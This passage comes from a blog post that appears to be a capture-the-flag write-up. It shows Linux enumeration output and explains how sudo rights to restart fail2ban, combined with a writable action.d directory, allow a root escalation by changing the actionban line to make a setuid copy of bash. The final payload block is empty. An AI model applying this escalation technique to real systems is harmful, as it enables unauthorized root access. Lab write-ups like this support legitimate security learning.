+</span></span><span style="display:flex;"><span>BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bugs.debian.org/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /proc/version
+</span></span><span style="display:flex;"><span>Linux version 4.19.0-20-amd64 <span style="color:#f92672">(</span>debian-kernel@lists.debian.org<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc version 8.3.0 <span style="color:#f92672">(</span>Debian 8.3.0-6<span style="color:#f92672">))</span> <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uname -mrs
+</span></span><span style="display:flex;"><span>Linux 4.19.0-20-amd64 x86_64
+</span></span></code></pre></div><h5 id="users-and-groups">Users and groups</h5>
+<pre tabindex="0"><code>awk -F&#39;:&#39; &#39;{ print $1}&#39; /etc/passwd
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+_apt
+systemd-timesync
+systemd-network
+systemd-resolve
+messagebus
+tss
+dnsmasq
+usbmux
+rtkit
+pulse
+speech-dispatcher
+avahi
+saned
+colord
+geoclue
+hplip
+Debian-gdm
+systemd-coredump
+mysql
+sshd
+postfix
+bind
+michael
+===================
+------Groups-------
+===================
+awk -F&#39;:&#39; &#39;{ print $1}&#39; /etc/group
+root
+daemon
+bin
+sys
+adm
+tty
+disk
+lp
+mail
+news
+uucp
+man
+proxy
+kmem
+dialout
+fax
+voice
+cdrom
+floppy
+tape
+sudo
+audio
+dip
+www-data
+backup
+operator
+list
+irc
+src
+gnats
+shadow
+utmp
+video
+sasl
+plugdev
+staff
+games
+users
+nogroup
+systemd-journal
+systemd-timesync
+systemd-network
+systemd-resolve
+input
+kvm
+render
+crontab
+netdev
+messagebus
+tss
+bluetooth
+ssl-cert
+rtkit
+ssh
+lpadmin
+scanner
+pulse
+pulse-access
+avahi
+saned
+colord
+geoclue
+Debian-gdm
+systemd-coredump
+mysql
+postfix
+postdrop
+bind
+michael
+security
+</code></pre><h5 id="kernel-information">Kernel Information</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ uname -ar
+</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux</span>
+</span></span></code></pre></div><h5 id="sudo-privileges">Sudo privileges</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> michael on trick:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User michael may run the following commands on trick:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>Searching google for <code>fail2ban sudo privilege escalation</code> brings many results, however <a href="https://juggernaut-sec.com/fail2ban-lpe/">this</a> link and <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/">this one as well</a> I found to be the most directly beneficial.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<p>fail2ban is an intrustion prevention software framework to help stop brute force attacks.</p>
+<p>According to the articles above, if we can execute <code>fail2ban</code> as root, we can gain access to privileges by modifying the configuration file. We need to check if the config file is writable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find /etc -writable -ls 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">269281</span>      <span style="color:#ae81ff">4</span> drwxrwx---   <span style="color:#ae81ff">2</span> root     security     <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">10</span> 23:30 /etc/fail2ban/action.d
+</span></span></code></pre></div><p>Look inside of <code>/etc/fail2ban/jail.conf</code> to know more about how fail2ban is configured.</p>
+<p>In this, we can not that <code>iptables-multiport</code> is the default actrion to run. The important line is the <code>actionban</code> which runs each time an IP hits the defined threshold.</p>
+<p>To get root, all we need to do is modify the <code>actionban</code> action in <code>/etc/fail2ban/action.d/iptables-multipath.conf</code> to make a copy of <code>bash</code> and set the SetUID which we can use to start a new bash shell with the privileges of the <code>root</code> user:</p>
+<pre tabindex="0"><code></code></pre></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
